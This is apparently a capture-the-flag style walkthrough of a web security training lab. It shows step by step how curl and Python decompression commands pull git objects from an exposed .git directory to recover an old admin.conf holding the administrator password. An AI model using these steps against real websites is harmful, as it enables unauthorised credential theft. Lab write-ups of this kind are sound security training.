# Information disclosure in version control history

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`.
        

![image.png](Information%20disclosure%20in%20version%20control%20history/image.png)

![image.png](Information%20disclosure%20in%20version%20control%20history/image%201.png)

![image.png](Information%20disclosure%20in%20version%20control%20history/image%202.png)

### **1. Get current commit hash:**

```bash
curl -s <https://0a910024035a9bd183d855840014007f.web-security-academy.net/.git/refs/heads/master>
```

**Output:** `91fa8d63ce61f34653faebfee165577fd70e3667`

### **2. Check git logs for history:**

```bash
curl -s <https://0a910024035a9bd183d855840014007f.web-security-academy.net/.git/logs/HEAD>
```

**Look for:** Older commit hashes and messages like "Remove admin password"

### **3. Get the FIRST commit hash from logs:**

From logs, you'll see:

- `28e3c2d8eab2c12bfca0a1687da03f589103eb87` (older commit)
- `91fa8d63ce61f34653faebfee165577fd70e3667` (current commit)

**First commit:** `28e3c2d8eab2c12bfca0a1687da03f589103eb87`

### **4. Download first commit object:**

```bash
curl -s <https://0a910024035a9bd183d855840014007f.web-security-academy.net/.git/objects/28/e3c2d8eab2c12bfca0a1687da03f589103eb87> | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))"

```

**Output shows:** `tree e30bc6aa54926fb2134d523c57bb6e25cf6f7360`

### **5. Download the tree:**

```bash
curl -s <https://0a910024035a9bd183d855840014007f.web-security-academy.net/.git/objects/e3/0bc6aa54926fb2134d523c57bb6e25cf6f7360> | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))"

```

**Shows files:** `admin.conf` and `admin_panel.php` with their hashes

### **6. Download admin.conf (contains password):**

```bash
curl -s <https://0a910024035a9bd183d855840014007f.web-security-academy.net/.git/objects/fb/c1671be231b237ff94a1ebeb8370c18b3f275d> | python3 -c "import sys,zlib; data=zlib.decompress(sys.stdin.buffer.read()); print(data.split(b'\\\\x00',1)[1].decode())"

```

**Output:** Will show admin username and password